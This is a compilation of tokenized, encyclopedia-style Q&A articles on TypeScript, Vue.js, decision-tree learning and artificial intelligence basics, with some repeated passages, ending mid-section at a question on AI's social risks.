It does this by supporting static typing so that type mismatches can be caught at compile time rather than at run time .
When coupled with tools that understand TypeScript , developers benefit from autocompletion , navigation and refactoring .
TypeScript came out of Microsoft and later open source .
TypeScript does n't replace JavaScript .
TypeScript transpiles to JavaScript .
In fact , a project can contain a mix of both languages .
Eventual execution is within the JavaScript runtime .
Why do we need TypeScript when there 's already JavaScript standardized by ECMA ?
TS code transpiles to JS code .
Source : Ohri 2017 .
JavaScript is a dynamically typed language .
This can be seen as a useful feature , but for projects maintained by large teams , it can be a source of bugs .
For example , a function expects an integer but a string is passed wrongly .
JavaScript will allow this until an error occurs at runtime .
TypeScript allows for static types .
This means that type mismatch errors are caught during development .
JavaScript before ES6 did n't allow for classes and modules .
This made JavaScript coding difficult for programmers coming from C # , Java or other object - oriented languages .
While ES6 remedies this , not all browsers support ES6 .
Babel offered a solution to this problem .
Developers can use the latest ECMAScript version but use Babel to transpile their code into a lower version that 's well supported by browsers .
The TypeScript compiler can also transpile TypeScript code to any chosen ECMAScript version .
This means developers can use the latest developments to TypeScript today without worrying about what browsers support .
Is n't TypeScript doing the same thing as AtScript , Flow , Dart or CoffeeScript ?
TypeScript is a superset of JavaScript .
Source : Neeman 2015 , slide 8 .
AtScript was invented by Google with the same goals as TypeScript .
In 2015 , given the popularity of TypeScript , Google discontinued AtScript and adopted TypeScript for its Angular 2 framework .
Later versions of TypeScript started supporting features introduced by AtScript .
Flow was invented on Facebook to provide static typing for JavaScript .
Thus , it 's an alternative to TypeScript .
However , we 've seen projects move away from Flow to TypeScript , including Facebook 's own Jest project .
Comparing Dart with TypeScript is not useful .
Dart compiles to native code but transpiles to JavaScript for web apps .
Dart is not JavaScript although it can interoperate with JavaScript .
TypeScript on the other hand , is JavaScript .
Existing JavaScript code can be treated as TypeScript .
Although CoffeeScript transpiles to JavaScript , its syntax is different from JavaScript .
CoffeeScript hides JavaScript syntax from the programmer but TypeScript does n't do this .
In fact , CoffeeScript is great for Ruby programmers since the syntax is Ruby - like .
In this context , Luke Hoban commented , CoffeeScript is to Ruby as TypeScript is to Java / C#/C++ Which projects have adopted TypeScript ?
The official TypeScript site lists a number of projects that have adopted the language .
Among the JS frameworks and libraries to use TypeScript are Angular , Ember , NativeScript , Ionic , Babylon.js , AMCharts and ZoomCharts .
Others include Asana , Aurelia , BitHound , Ericsson , EBay Classifieds , Hobsons , JetBrains , Kaggle , Palantir , Ubisoft , and many more .
In September 2018 , Expo SDK started working towards supporting TypeScript , in addition to Flow .
They noted that TypeScript is stable and expressive .
Just as importantly , Babel 7 supports TypeScript and therefore , Expo can continue using Babel - based builds .
Vue.js announced that its own codebase for version 3.x and beyond will be based on TypeScript .
Its API will be designed to make use of TypeScript 's type interference , although TypeScript will remain optional for apps .
Atlassian 's project that enables beautiful drag - and - drop interfaces moved to TypeScript in December 2018 .
Storybook , used for building UI components , is now in TypeScript .
In January 2019 , Facebook 's Jest project decided to move away from Flow to TypeScript .
PayPal 's ` paypal - scripts ` is another example .
Could you mention some key features of TypeScript ?
Static type checking is an important part of TypeScript but this is optional .
This means that we can add type checking gradually to a project , especially the legacy JavaScript project .
The language has new useful types : tuple , enum , any , void , never .
Variable declarations can specify ` let ` or ` const ` .
For object members , we can use ` readonly ` .
Type assertions are similar to type - casting in other languages .
A variable can take one of many specified types .
Generics are allowed .
Classes with properties , methods , and constructors are now possible with TypeScript .
Constructors , and functions in general , can be overloaded .
Via interfaces , abstractions are made explicit and this makes code easier to read and maintain .
JavaScript code generated by the TypeScript compiler is very readable , which means that debugging is possible on the generated code without using source maps .
Other ES6 features such as module imports and destructuring are supported .
TypeScript supports decorators ( also available in ES7 ) .
Could you share some tips or best practices for beginners with TypeScript ?
The best way to initialize a new project is using ` tsc --init ` .
A file ` tsconfig.json ` will be created .
It 's possible to extend this configuration file with another file so that we can target different ECMAScript versions if necessary .
It is often good practice to store generated JS files in a separate folder .
It 's common to have TS files in ` src/ ` and JS files in ` dist/ ` .
The compiler option ` --outfile ` helps with this ; or you could use the ` outDir ` option in the config file .
You can define a type using either ` type ` or ` interface ` .
The latter is more flexible because it can be extended to create another interface or implemented in a class .
Interfaces can be defined multiple times , adding new members with each definition .
When indexing a data type with a key , such as in a tuple , or accessing a member of an interface , use ` keyof ` to create a type for the keys .
This enables type checking on the keys .
Many more tips are part of official documentation , in a Zalando blog post , and in a Medium post .
What are the different file extensions for TypeScript ?
The example shows the TS code and its equivalent JS code .
Source : Scriptol 2019 .
Typescript source code files are usually saved with ` * .ts ` extension .
When transpiled , the equivalent ` * .js ` JavaScript files are created .
Files with ` * .d.ts ` extension contain type definitions .
Your TypeScript code may be using third - party JavaScript libraries .
How can we then ensure type safety when your TypeScript code is called these JavaScript libraries ?
This is where these type definitions become useful for IDEs and TypeScript compilers .
JSX is an XML - like syntax for designing UI components .
It was popularized by React .
TypeScript supports this and files that use this syntax have the extension ` * .tsx ` .
When these files are transpiled , they generate either JSX files ( to be used by other transpilers such as Babel ) or JS files that are understood by React or React Native .
Microsoft started working on creating TypeScript .
It 's not a new language .
Rather , it 's an augmentation of JavaScript .
One motivating factor is that the Bing Maps team has difficulty making JavaScript scale .
There are probably other teams within Microsoft facing similar issues with JavaScript .
Microsoft releases TypeScript specification and open sources its own TypeScript compiler .
Visual Studio gets a plugin for TypeScript .
The creator of C # , Anders Hejlsberg , notes that JavaScript was designed as a scripting language , for small to medium - sized projects .
TypeScript 's static typing will address the scalability problem .
He adds , JavaScript is an entirely dynamic language that has no static typing , and static typing is really the thing that powers today 's rich IDEs .
Microsoft completes its moving of the TypeScript codebase from CodePlex to GitHub .
The idea is to go where the community is active , and attract Linux and Mac developers .
This year sees many releases of TypeScript : 1.4 ( Jan ) to 1.7 ( Nov ) .
Among the features / types introduced are ` let ` , ` const ` , template strings , type guards ( ` typeof ` , ` instanceof ` ) , ES6 modules , ES6 destructuring , decorators , ` namespace ` keyword , ` tsconfig.json ` config file , JSX , abstract classes , async / await , and ` this ` typing .
Monthly Active Users ( MAU ) on GitHub for TypeScript sees rapid growth since 2015 .
Source : Frederickson 2018 .
It 's announced that Angular 2 will be built using TypeScript .
Over the next few years , this will influence more developers to adopt TypeScript .
TypeScript 2.0 has been released .
Type definitions are now available via NPM at ` @types ` .
This deprecates earlier approaches : DefinitelyTyped , TSD , Typings .
As of April 2019 , more than 6,300 packages have type definitions .
TypeScript 3.0 has been released .
Babel 7 has been released with support for TypeScript .
This means that TypeScript can be transpiled to JavaScript using Babel .
Thus , TypeScript - based projects can continue to benefit from Babel 's rich ecosystem and plugins .
The TypeScript compiler can still be used for type checking .
Large projects can benefit from migrating their JavaScript code to TypeScript .
Due to TypeScript 's support for static types and good tooling , type - related problems can be caught during development and at compiling time .
However , migrating a large codebase can be a daunting task , but this is easier than imagined in TypeScript .
Since TypeScript is a superset of JavaScript , the TypeScript compiler can deal with JavaScript files as well , leaving them untouched and skipping type checks .
This means that migration can happen incrementally , file by file .
Tools are available to refactor code during the migration process .
It 's also been observed that the workflow for TypeScript projects is a lot easier now than what it used to be .
This means that TypeScript can be adopted for even small projects .
Could you share some case studies of JS - to - TS migration ?
Lucidchart migrated their entire codebase of 600k lines across 2840 files in just three days , resulting in 500k lines of TypeScript code .
About 80 % of the conversion was aided by tools .
They made a dependency graph on a spreadsheet , started converting from the leaves and moved up file by file .
At each step , they checked that TS files were compiled successfully .
After pushing to production , the team expected issues to arise but none were reported .
One developer reported that his code size ( involving 180 + files ) increased 30 % when moving from JavaScript to TypeScript .
In general , this may be acceptable in large projects where the benefits of type checking are far greater .
The fact that all JavaScript is valid in TypeScript was seen in a Dojo - AMD project .
AMD module imports were converted to ES6-style understood by TypeScript .
Loading of plugins and exporting of modules were updated .
Otherwise , no additional changes were required .
What 's the recommended procedure for migrating my JavaScript codebase to TypeScript ?
An example is TS - to - JS migration along with TS options .
Source : Konyk 2017 .
The simplest approach is to create a new TypeScript project and add all the legacy JavaScript code to it .
TS compiler will understand JS source code , although without type checking .
This is possible due to the ` allowJs ` option .
Any new files that you create should be in TypeScript .
You can start adding type checking to existing JS files using type declaration files , of extension ` * .d.ts ` .
Use the ` types ` option when invoking the TS compiler .
At a later stage , you can refactor your JS files into TS files , at which point type declaration files become redundant .
Gradually , legacy code can be migrated .
Simply rename ` * .js ` files to ` * .ts ` files .
Then start introducing type declarations in the legacy files , although TypeScript 's type inference can resolve types in most cases .
Linting can throw up a lot of issues when JS files are renamed to TS files .
One approach is to disable linting by adding ` // tslint : disable ` at the start of all legacy files .
Then , enable linting file by file when you start working on them .
Do you have any tips for refactoring JS code to TS ?
Migrating JavaScript security code to TypeScript .
Source : Rastogi 2013 , slide 7 .
Since TypeScript is object - oriented , it converts function constructors into class constructors .
Give member variables explicit access modifiers .
Use ` public ` but you can restrict access by using ` protected ` or ` private ` .
Replace instance methods with arrow methods , which will use ` this ` reference to the object .
Replace prototype methods with methods .
To pass TS compilation , you may be tempted to use ` any ` type : avoid doing this .
However , since migration is often incremental , allow TypeScript to automatically infer the ` any ` type if type is not specified .
You can suppress this behaviour later using the ` noImplicitAny ` option .
The Legacy code might contain runtime type checks and related exception handling .
Because now type checking is done at compile time , these extra bits of code can be removed .
This can even improve performance .
When migrating security code , it 's recommended that critical code be migrated to TS first .
Apps and third - party code can be migrated later .
What extra configuration should I do in a TypeScript project ?
JavaScript executes directly within the JS runtime .
This is not possible with TypeScript .
TypeScript files have to be converted to JavaScript ( called transpilation ) before they can be executed .
Hence , a TypeScript project must be set up to automate this conversion .
Webpack can be set up with a config file ` webpack.config.js ` .
This can make use of ` ts - loader ` to load TS files and ` json - loader ` for JSON files .
Type declarations for third - party JS modules can be installed from @types .
For example , to install " prompt - sync " you can do ` npm install --save - dev @types / prompt - sync ` .
Another possible loader to use is the ` awesome - typescript - loader ` .
This can be combined with ` source - map - loader ` to assist source level debugging .
Note that it 's common for JavaScript projects to use a transpiler to convert between different versions of JavaScript .
This is particularly true on the web where code has to run correctly on old browsers .
If your JS project is already setup to do this , migrating to TS is even easier .
For example , a React project might use Webpack and Babel .
This can be reconfigured so that Webpack reads the output of the TypeScript compiler rather than the original JS code .
As a beginner , should I learn JavaScript before moving on to TypeScript ?
TypeScript is a superset of JavaScript .
It does n't hide JavaScript syntax .
For this reason , beginners are encouraged ( but not required ) to learn JavaScript .
In fact , TypeScript should n't be used to bring non - JS developers to the front .
Before migrating to TypeScript , it 's good to ask what the background of those who will be working on it .
In one instance , a team of C # developers could quickly learn TypeScript for frontend - work .
In fact , developers with a background in object - oriented programming will be able to pick up TypeScript easily .
Are there tools to automate JS - to - TS migration ?
ReSharper 9 allows conversion to TS at different levels .
Source : Lomshakov 2015 .
Back in 2015 , JetBrains described how easy it is to use the ReSharper 9 tool to perform conversions .
Some of the limitations of the tool are possibly be removed in later updates .
The tool allows us to convert a file , an entire folder , a project or a solution .
Npm package js - to - ts - converter may also help .
Airbnb 's ts - migrate may also help to automate the migration .
However , a manual follow - up is needed to improve type safety .
If you 're using Closure - annotated JS , gents ( open sourced by Google ) can be used to convert to TypeScript .
Related tools are clutz and tsickle .
TypeScript 1.8 starts supporting the compiler option ` allowJs ` .
This makes it easier to directly use JS files within a TypeScript project .
TypeScript compiler will do basic sanity checks on JS files but otherwise pass them to the output .
Type definitions are now available via NPM at ` @types ` .
This deprecates earlier approaches : DefinitelyTyped , TSD , Typings .
As of April 2019 , more than 6,300 packages have type definitions .
Babel 7 has been released with support for TypeScript .
This means that TypeScript can be transpiled to JavaScript using Babel .
Thus , TypeScript - based projects can continue to benefit from Babel 's rich ecosystem and plugins .
The TypeScript compiler can still be used for type checking .
Vue.js logo .
Source : Vue 2019 .
Vue.js is a lightweight frontend - - - - - JavaScript framework .
It can be used to develop modular UI components or entire Single Page Applications ( SPAs ) .
It features an incrementally adoptable architecture that focuses on declarative rendering and component composition .
Advanced features such as routing , state management , build tooling , animations , and validations are offered via officially maintained libraries and packages .
If you know HTML , CSS , and JS , it 's easy to get started with Vue.js .
Because of its lean design , it takes up only a few tens of kilobytes .
It 's fast .
It 's open - source and community - led .
It integrates well with other tools .
It 's also being used to build mobile apps .
What 's the benefit of using Vue.js over Vanilla JavaScript ?
Introduction to Vue.js .
Source : Vue Mastery 2017 .
JavaScript enabled us to add more dynamic content to web pages plus have rich user interactions .
With vanilla JS , this comes with increased code complexity and low maintainability .
For example , to add interactions we would need to link event handlers to DOM elements , code these handlers ( using vanilla JS or jQuery for example ) , make AJAX calls , handle the responses and update DOM elements .
All this was done using hand - crafted code that was difficult to scale and maintain for large projects .
It 's to solve this problem that JavaScript frameworks were introduced .
Vue.js is one of them , with Angular and React being alternatives .
Vue.js is said to be approachable , versatile and performant .
Vue.js is a progressive JS framework .
This means that you 're not forced to move your entire app at once .
Instead , you can incrementally migrate some components that need rich interactions .
Vue.js plays well with other codes .
You can use Vue.js code in apps written in other frameworks and also embed other code inside of Vue.js .
Who 's using Vue and what 's been their experience ?
Vue.js use cases in 2018 .
Source : Gawron 2019 .
In 2017 , Vue.js was named the " most willingly learned technology " .
Companies of all sizes and market domains have adopted Vue.js .
These include Netflix , Facebook , Alibaba , Adobe , Xiaomi , Grammarly , Laracasts , Behance , GitLab , 9gag , Nintendo , Chess , and Font Awesome .
Made With Vue.js showcases lots of projects developed using Vue.js .
These include components , frameworks , webapps , websites , games , and more .
A survey of 1,553 responses collected in Nov - Dec 2018 showed that 92 % would use Vue.js for their next project .
75 % saw ease of integration as the biggest advantage and 58 % found it easy to learn and apply .
More than half saw documentation , performance and progressiveness as important advantages .
How does Vue.js compare against other frontend - - - - - development frameworks ?
Comparing Angular , React and Vue .
Source : Bhimani 2018 .
The common parameters for comparing various frontend frameworks are features , documentation , developer tooling , adoption , third - party libraries , and community support .
While React and Angular are led by Facebook and Google respectively , Vue.js is more community - led , though there 's a core team to set roadmaps .
For building complex apps , other frameworks such as Ember and Angular provide an opinionated set of components .
Vue.js core instead focuses on data binding , similar to React .
Outside the core functionality , React leaves everything to the community .
This creates churn , with developers not sure what to adopt .
Vue.js takes the middle path where the core exposes minimal features and other official libraries offer incrementally adoptable pieces ; but developers are not tied to using them .
Thus , it 's more approachable to react .
It 's been said that for migrating AngularJS ( not Angular ) apps , Vue.js is a natural fit mainly due to similar templating syntax and reactive model .
In incremental migration , Vue.js and AngularJS play nicely with each other .
Vue.js is about 80 KB while React is 100 KB and Angular is 500 KB .
Hacker Noon offers a detailed comparison of the three frameworks .
What are the main features of Vue.js ?
Anatomy of a Vue.js component .
Source : Nigam 2019 .
Vue essentially extends HTML with components .
These are custom elements to which the Vue compiler attaches behaviour and binds data .
Vue uses templates that are compiled to virtual DOM render functions .
A Vue component also has scripts for defining local data , props , computed properties , watchers , methods , and lifecycle hooks .
We can also include component specific styles that are scoped to the component .
CSS styling can also use pre - processors such as Less or SCSS .
When data changes , CSS transitions and animations can be easily coded with Vue .
Vue adopts the ViewModel part of the Model - View - ViewModel ( MVVM ) architecture .
However , developers can adopt Flux architecture , as is usually the case when using Vuex for state management .
We can use props to pass data down to components .
To inform a parent component that some data has changed , use ` $ emit ` events .
For more complex communication , use EventBus ( for small apps ) or Vuex ( for large apps ) .
Other useful features are built - in modifiers , mixins , plugins , filters , JSX , and custom directives .
What 's the Vue.js component lifecycle ?
Vue.js component lifecycle .
Source : Andersen 2017 .
A Vue.js component moves through different states in its lifetime : created , mounted , updated , destroyed .
These states are associated with a number of lifecycle hooks that we can use to execute custom JS code .
Just after a Vue component is installed , ` beforeCreate ( ) ` is called .
At this point , the component has no access to the data model .
Once created , the ` created ( ) ` hook is called , which is a good place to load any data .
Now , the component is ready to watch data for changes and listen for events .
However , the component is still isolated from the view layer ( the native DOM ) and nothing will be displayed .
Vue will display the data only when a component is mounted .
Hooks relevant in this phase are ` beforeMount ( ) ` and ` mounted ( ) ` .
Once mounted , we can access the ` $ el ` property that helps us update the DOM when necessary .
Once mounted , an update cycle is started whenever data is updated .
The Virtual DOM is updated and differences are patched to the native DOM for efficient rendering .
The relevant hooks are ` beforeUpdate ( ) ` and ` updated ( ) ` .
When a component is no longer required in the DOM and being destroyed , we can use hooks ` beforeDestroyed ( ) ` and ` destroyed ( ) ` .
What is the ecosystem around the core of Vue.js ?
The Vue.js ecosystem .
Source : Nigam 2019 .
The Vue team maintains the Vue.js core that focuses on the view layer .
They also maintain other libraries that help you build rich single page applications : vue - router : For SPA routing .
vuex : For large - scale state management .
vue - cli : To create project scaffolding .
vue - loader : A loader for webpack .
This is useful for Vue components in a format called Single - File Component ( SFC ) , which is a ` * .vue ` file .
vue - class - component : TypeScript decorator for a class - based API .
vue - rx : RxJS integration .
vue - devtools : Browser DevTools extension .
This can be a Chrome extension , Firefox addon or a standalone Electron app .
vue - test - utils : For unit testing .
vue - server - renderer : For building isomorphic or universal JS apps , with app code running on both server and client .
As an alternative , there 's Nuxt.js , just as React has Next.js .
Which are some third - party libraries and tools for Vue developers ?
Here are some third - party tools that might interest developers : vue - templates : Out - of - the - box templates to avoid manual config and boilerplate .
vue - dummy : For placeholder text and images .
VuePress : Static site generator .
Gridsome : Framework for static sites with GraphQL for data management .
Vuetify : UI component library based on Material Design .
Quasar : Framework that enables a single codebase for SPAs , PWAs , hybrid mobile apps , desktop apps , etc .
Storybook : For writing UI components and targeting multiple frontend - frameworks .
Vue Apollo : Integrate Vue with GraphQL .
Weex : Framework for building mobile apps with Vue and others .
Bit : To organize and share components across apps .
Vue Starter : Boilerplate for production - ready PWAs .
Vue Design System : A set of tools , patterns , and practices for building UI design systems .
VS Code / Atom Integration : Vue - related extensions for VS Code and Atom editors , to name just a couple .
Could you share some tips and best practices for using Vue.js ?
When you reuse components across views , new Vue instances wo n't be instantiated .
Instead , they use a custom handler to react to route changes .
Avoid manipulating the DOM directly .
Instead , use ` $ refs ` .
Use computed properties to manipulate component data .
These are also cached from their reactive dependencies .
Validate your props .
Here are some tips for better performance : Loop Items : Use ` : key ` so that Vue can update items more efficiently .
Functional Components : Cheaper than stateful components .
Use these if you 're only accepting props and rendering markups .
Component Registration : Avoid registering all components globally .
Import specific components within other components , preferably asynchronously .
Code Splitting : Split your code into logical parts to reduce JS bundle size .
Enables lazy loading .
Lazy Loading : For local component registration , route declaration and other stuff not needed upfront .
Load components as necessary based on user actions .
SVG : Hide / show elements rather than frequently removing or adding them .
A faster alternative to SVG is to use Canvas and WebGL , which are not XML based .
What are some criticisms or concerns about Vue.js ?
Traditionally , Vue.js was not suited for building mobile apps .
This is changing .
Vue 's founder , Evan You , commented in March 2019 that Vue.js is already " unofficially " supporting integration with NativeScript , Quasar and Ionic 4 .
What are some useful resources for a beginner learning Vue.js ?
A good place to start learning Vue.js is to read the official guide .
A series of Vue videos on Laracasts is worth studying .
Vue Mastery is another useful resource with lots of Vue lessons .
For building SPAs , read Bland 's tutorial or Chuchin 's tutorial .
For building PWAs , read Rajat 's tutorial .
For reference , Vue Mastery has released a handy cheat sheet .
For ready - to - use themes , Creative Time provides UI kits , templates and dashboards based on Vue.js .
For the latest news , follow The Vue Point , the official Vue.js blog .
Developers who wish to contribute , should head to the Vue.js page on GitHub .
Evan You at Google Creative Lab started experimenting with the good parts of Angular , especially its declarative data binding .
He feels that for simple use cases , Angular is too heavy and opinionated .
It 's from here that he created and named Vue.js .
Evan You releases the Vue code on GitHub and shares a link to Hacker News .
The project got several hundred stars within the first week .
The actual version is Vue 0.9.0 Animatrix .
Since then , Vue releases are code named based on anime names .
Version 1.0.0 Evangelion is released after 300 + commits , 8 alphas , 4 betas and 2 release candidates .
The API is cleaned up to suit large projects , keeping in mind maintainability and refactoring .
For fast initial rendering , ` v - repeat ` is replaced with ` v - for ` .
Apart from the core , vue - loader , vueify and vue - router now provide a good foundation for building Single Page Applications .
Also supported are hot component reloading and scoped CSS .
Vue 2.0 has better performance than other frameworks .
Source : You 2016 .
Version 2.0.0 Ghost in the Shell is released .
Work on this version started in April .
This release includes TypeScript typings and superior rendering performance compared to Vue 1.0 .
Server - side rendering is possible .
There 's JSX support via a Babel plugin .
The runtime is only 16 KB when minified and zipped .
Vue CLI 3.0 has been released .
It 's a rewrite of the older version .
The aim is to reduce configuration fatigue and make it easier to work with multiple tools .
It provides a pre - configured build setup using Webpack .
It supports ES2017 transpilation , polyfills injection , CSS pre - processors , and more .
The CLI comes with a beta version of a GUI .
This deprecates the older ` vue - cli ` command .
In February , Vue 2.6.0 Macross is released .
Meanwhile , Evan you commented that Vue 3.0 is likely to be released in 2019 .
It 's a rewrite that sees some internal parts becoming individual packages .
TypeScript is being used for the new version .
You may wish to view a video titled Vue.js in 2019 & Beyond .
Illustrating a decision tree .
Source : Navlani 2018 .
In machine learning , we use past data to predict a future state .
When data is labelled based on a desired attribute , we call it supervised learning .
There are many algorithms that facilitate such learning .
Decision tree is one such .
Decision tree is a directed graph where nodes correspond to some test on attributes , a branch represents the outcome of a test and a leaf corresponds to a class label .
Could you explain with an example how a decision tree is formed ?
The decision tree is based on two decision nodes .
Source : Petrenko 2015 .
Assuming sufficient data has been collected , suppose we want to predict if an individual has a risk of high blood pressure .
We have two classes , namely , high BP and normal BP .
We consider two attributes that may influence BP , overweight and the extent of exercise .
The first decision node ( topmost in the tree ) could be either weight or the extent of exercise .
Either way , we also decide the threshold by which data is split at the decision node .
We could further split the branches based on the second attribute .
The idea is to arrive at a grouping that clearly splits those at risk of high BP and those who are not .
In the figure , we note that being overweight clearly separates individuals at high risk .
Among those who are not overweight , exercise attributes must be used to arrive at a suitable separation .
The process of choosing the decision nodes is iterative .
The leaf node is chosen when the data in the node favours one class over all other classes .
How is information entropy related to decision trees ?
Binary entropy function .
Source : Wikipedia 2018 , Entropy of a Bernoulli trial .
Entropy measures the uncertainty present in a random variable X. For example , an unbiased coin can either show head or tail when tossed .
It has maximum entropy .
If the coin is biased , say towards head , then it has less entropy since we already know that head is more likely to occur .
The uncertainty is quantified in the range of 0 ( no randomness ) and 1 ( absolute randomness ) .
If there is no randomness , the variable does not hold any information .
Consider a binary classification problem with only two classes , positive and negative class .
If all samples are positive or all are negative , then entropy is zero or low .
If half of the records are of the positive class and half are of the negative class , then entropy is one or higher .
Mathematically , entropy is defined as $ $ H(X ) = - \sum_{i=1}^n p_i(x ) * log _ 2 p_i(x)$$ What is the Gini Impurity ?
Comparing Gini Impurity and Entropy .
Source : Kosaka 2018 .
Gini Impurity ( also called Gini Index ) is an alternative to entropy that helps us choose attributes by which we can split the data .
It measures the probability of incorrectly identifying a class .
The lower the Gini Index is , the better it is for the split .
The idea is to lower the uncertainty and , therefore , get better in classification .
Mathematically , Gini Impurity is defined as $ $ Gini(X ) = 1 - \sum_{i=1}^n p_i(x ) ^2$$ The choice of attribute between 2 classes , \(x_1\ ) and \(x_2\ ) , with \(N_1\ ) and \(N_2\ ) as the number of instances , and \(N = N_1+N_2\ ) is calculated from $ $ Gini(X ) = \frac{N_1}{N } * Gini(x_1 ) + \frac{N_2}{N } * Gini(x_2)$$ where $ $ Gini(x1)=1 - p(x_1 ) ^2$$ What is information gain ?
An Example illustrates the calculation of information gain .
Source : Hendler 2018 , slide 46 .
Information gain is change in entropy , prior to split and post split , with respect to selected attribute .
We select that attribute for splitting data if it gives a high information gain .
Information gain is also called Kullback - Leibler Divergence .
Information Gain IG(S , A ) for a set S is the effective change in entropy after deciding on a particular attribute A. Mathematically , $ $ IG(S , A)=H(S)-H(S , A)$$ What are the pros and cons of decision trees ?
Among the pros are , decision trees are easily interpretable since they mirror human decision - making process and a white box model .
Decision trees can be used for both regression ( continuous variables ) and classification ( categorical variables ) .
Decision trees are non - Parametric .
This means we make no assumption on linearity or normality of data .
Among the cons are , small changes to data may alter the tree and therefore the results .
Decision Trees are therefore not robust .
When a tree grows large and complex , it tends to overfit .
This is overcome by limiting tree depth , boosting or bagging .
Morgan and Sonquist propose Automatic Interaction Detection ( AID ) , the first regression tree algorithm .
This recursively splits data depending on impurity and stops splitting on reaching a certain level of impurity .
Messenger and Mandell propose Theta Automatic Interaction Detection ( THAID ) , the first classification tree algorithm .
This recursively splits data to maximize cases in modal category .
Kass proposed Chi - square Automatic Interaction Detection ( CHAID ) that splits data into nodes to start with and then merges nodes that have non - significant splits .
This is quicker but can be inaccurate .
Researchers improvise AID and THAID to arrive at Classification and Regression Trees ( CART ) .
This is done to improve accuracy by pruning the tree .
The CART also gives variable importance scores .
Qunilan proposes Iterative Dichotomiser ( ID3 ) where he uses information entropy to quantify impurity .
This is then used to calculate the gain ratio for two - class decisions .
As an extension to ID3 , Quinlan proposes C4.5 .
This can handle multiple - class decisions .
The AI Process .
Source : Cook 2018 .
Intelligence demonstrated by machines that mimic human decisions and actions for problem solving is called Artificial Intelligence .
Intelligence accumulated in the machine is a result of an incremental learning process from data accumulated in the business environment .
Human intelligence consists of varied aspects – discriminating between objects , identifying people and places , understanding languages , recognizing sounds and music , logical analysis and mathematical computations .
The list is endless .
AI systems are being developed for specific goal - oriented applications covering some of these abilities .
Machine Learning , Big Data and Robotics are its key enablers .
Neural networks ( a study that understands how the human brain works ) help to add human - like intelligence to the computer .
Examples include Google Street View , iPhone Face unlock and Walmart 's automated supply chain .
AI is still in a nascent stage , but is one of the most rapidly growing technologies in the world .
AI is not a new discovery .
Why is there such a buzz around AI all of a sudden ?
A popular theme in science fiction and folklore , the field of AI research was founded as an academic discipline as early as 1956 .
There was thriving activity for two decades , with ambitious targets set to match human intelligence .
However , nothing substantial could be achieved by the 1970s , with heavy rule - based systems having poor computational power .
A bleak withdrawal period called the AI Winter followed when research and funding slowed down .
In the 21st century , several parallel developments have renewed interest in AI .
The exponential increase in computer processing speed , an major drop in memory costs , an upsurge of open source programming frameworks , and advancement in voice and image processing techniques turned out to be game changers .
The advent of big data and cloud computing enabled large scale distributed deployments feasible at company / national level .
When machine learning moved from rule - driven to data - driven algorithms , AI got the biggest boost .
Historical data turned into a powerful enabler .
Wireless networks , smart devices , IOT and developments in robotics have completed the circle .
AI solutions have reached the maturity to be cost effective and implementable .
What are the major components of an AI solution ?
Components of AI solutions .
Source : Costenaro 2018 Listed below are the main components that act as building blocks in any modern day AI solution : Machine Learning - Computers use statistical techniques to " learn " ( progressively improve performance on a specific task ) from data , without being explicitly programmed .
ML is supported by large volumes of data called Big Data .
Data could be historical or real - time data , structured or unstructured .
Data is stored in distributed cloud computing and storage systems .
ML also employs a computing system called Artificial Neural networks , inspired by how biological nervous systems and the brain process information .
Eg : Image recognition , how a child identifies a cat .
Natural Language Processing - Ability to detect words and meanings from human voice in various spoken languages .
Systems like voice assistants learn from past data and improve their language interpretation over time .
Robotics - The mechanical arm of AI that enables automated decisions to be implemented though robots , driverless cars , drones and other smart devices .
Speech and Vision - Enabling the computer with human - like senses of speech and vision using speech encoding and image recognition algorithms .
What are the different approaches to AI ?
AI means empowering machines to act as humans would .
This intelligence can be fed into machines in several ways .
These approaches can be grouped into one of the two categories listed below : Symbolic , rule - based approach – Expert Systems – Artificial General Intelligence : The goal is to produce general human - like intelligence , not specific to a given problem at hand .
Symbolic representations are used to cover responses to unplanned , uncertain situations , adding weightage to social , emotional aspects as well as logic .
This approach was prevalent in the early years ( 1960s-1990s ) with the development of fuzzy logic and expert systems .
The IBM chess program that beat Garry Kasparov in the 1990s is a good example of this approach .
Statistical , data - based approach – Machine Learning – Narrow / Weak AI : With the advent of Machine Learning , the approach to AI has changed .
ML employs statistical modelling algorithms on historical data and derives " intelligence " from experience .
This method is effective for specific business problems , hence the name Narrow AI .
The goal is to build AI by consolidating intelligence from different scenarios .
Applications in the medical field for disease detection and drug testing on patients is a prominent application of this approach .
Which are the common open source frameworks for building AI solutions ?
One of the main reasons for explosive growth in AI research and development in recent times is the availability of reliable , efficient open source programming frameworks that support AI solutions development .
Not just major IT corporations , but university projects and small startups are also joining the AI bandwagon because of this .
Some of the widely used programming languages and frameworks are listed below : Python and R Programming Languages - Basis for almost all ML algorithm implementations powering AI solutions .
They have a strong developer community and an excellent package of library support for most applications .
Python is the base over which several ML / DL and NLP frameworks are built .
TensorFlow Deep Learning Framework - Python based computational framework from Google for building Deep Learning models .
Widely used for building hierarchical ML applications , deep belief nets .
It 's being used for translation in Google 's Translate , for OCR in WPS Office , fraud detection in PayPal .
PyTorch - Deep Learning framework from FaceBook .
Major vendors like Microsoft and Amazon are expected to provide complete support for the framework across their cloud products .
Keras , Theano , and MS CNTK are some other frameworks .
What are the applications of AI that are currently in the market ?
AI applications have pervaded all areas of work and life .
From the mobile phone in hand to futuristic space research , AI is everywhere .
AI applications domain - wise are listed below : Smartphone Apps and Utilities - Google Street View , iPhone Face unlock , voice assistants .
Retail - Automated supply chains , scanning product images and shop , automated billing , customized shopping experience .
Healthcare - Early disease detection , preventive diagnostics , automated drug trials .
Financial Services - Bots on the stock market , fraud detection , estimating customer credit worthiness .
Auto Industry - Vehicle preventive maintenance , driverless cars , delivery drones .
Fashion - Customized clothing for buyers , smart inventory management .
Human Resources - Resume elimination and talent acquisition process automation , personalised training and on - boarding for employees .
What are the technical challenges associated with AI research and development ?
AI - Technology Challenges .
Source : Deloitte .
2017 .
Computing Power Limitations - There is exponential growth in processing speeds , distributed computing abilities and large - scale memory storage .
But demands are even greater , especially with deep learning applications .
Only large corporations can match demand , and this limits the scope for startups .
Skilled Manpower - AI applications require niche computer science skills such as ML , NLP , image processing , robotics , and data sciences .
Since most of these fields of study are still evolving , finding high quality manpower is a challenge .
Reskilling engineers from traditional programming or design skills to new - age AI skills is the need of the hour .
Data Security - Data is the biggest wealth of an organization today .
With more and more private business data coming online , it becomes vulnerable to external misuse and attacks .
Companies need to focus on data security and network frameworks to protect their data .
What are the social and economic risks associated with AI technology ?
However promising and revolutionary AI may sound , it comes saddled with several risks impacting society and livelihoods .
